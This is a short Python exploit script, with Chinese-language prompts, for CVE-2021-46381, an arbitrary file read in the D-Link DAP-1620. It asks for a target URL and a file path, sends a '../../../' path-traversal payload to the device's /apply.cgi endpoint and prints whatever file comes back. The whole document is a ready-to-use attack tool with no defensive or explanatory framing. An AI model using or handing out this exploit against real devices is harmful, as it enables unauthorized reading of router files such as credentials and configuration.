
import requests
import json
import sys
import time

def title():
    print('''
+-----------------------------------------------------------+
+ ~~~~~~~~~~~~~~~~DLINK DAP-1620 任意文件读取~~~~~~~~~~~~~~~+
+ USE: python3 cve-2021-46381.py                            +
+ URL: http://x.x.x.x:port                                  +
+-----------------------------------------------------------+
''')
    time.sleep(1)


def read_files(url,file_name):
    url = url + "/apply.cgi"
    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101 Firefox/100.0"}
    data = "action=do_graph_auth&html_response_page=../../../{}&tkn=634855349".format(file_name)

    try:
        res = requests.post(url=url,headers=headers,data=data)
        if "no_token" in res.text:
            print("[!] 目标系统读取文件失败！")
            sys.exit(0)
        else:
            print("正在读取文件..........")
            content = res.text
            print("[o] 读取文件内容为：\n\033[34m{}\033\0m".format(content))
    except Exception as e:

        print("[!]  目标系统似乎意外中断了",e)
        sys.exit(0)


if __name__ == "__main__":
    title()
    url = str(input("\n[!]  请输入目标系统URL: "))
    file_name = str(input("[!]  请输入要读取的文件："))
    read_files(url,file_name)